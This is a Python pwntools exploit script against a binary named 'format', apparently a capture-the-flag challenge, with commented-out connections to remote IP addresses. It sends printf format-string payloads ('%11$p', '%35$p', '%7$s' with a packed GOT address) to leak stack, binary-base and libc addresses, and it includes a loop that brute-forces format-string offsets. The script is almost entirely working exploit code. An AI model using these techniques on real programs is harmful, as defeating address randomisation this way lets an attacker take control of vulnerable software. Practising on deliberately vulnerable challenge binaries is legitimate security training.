from pwn import *

elf = context.binary = ELF("./format")
context.log_level = "debug"

io = process(elf.path)
# io = remote('94.237.50.221', 55171)

io.sendline(b'%11$p')
leak = io.recv().decode().strip()
print(f"Leak: {leak}")
leak = int(leak, 16)
returninstack = leak - 0x58
print(f"Return instruction stack address: {hex(returninstack)}")

io.interactive()


# for i in range(1, 100):
#     io.sendline(f'AAAAAAAA%{i}$p'.encode())
#     leak = io.recvline().strip()
#     print(f"Leak at offset {i}: {leak.decode()}")




# from pwn import *
# elf = context.binary = ELF("./format")
# context.log_level = "error"

# # io = process(elf.path)

# io = remote('94.237.59.174', 31491)

# io.sendline(b'%35$p')
# # io.sendline(b'%71$p')
# leak = io.recvline().strip()
# leak = int(leak, 16)
# binary_base = leak - 0x10c0
# print(f"Binary base: {hex(binary_base)}")

# printf = 0x3fc0
# fgets = 0x3fc8
# fail = 0x3fb8
# setvbuf = 0x0000000000003fd0

# payload = b'%7$sAAAA' + p64(binary_base + setvbuf) 
# # print(f"Payload: {payload}")
# io.sendline(payload)

# leak = io.recv().split(b'AAAA')[0]
# leaked_address = u64(leak.ljust(8, b'\x00'))
# print(f"Leaked address: {hex(leaked_address)}")



# io.interactive()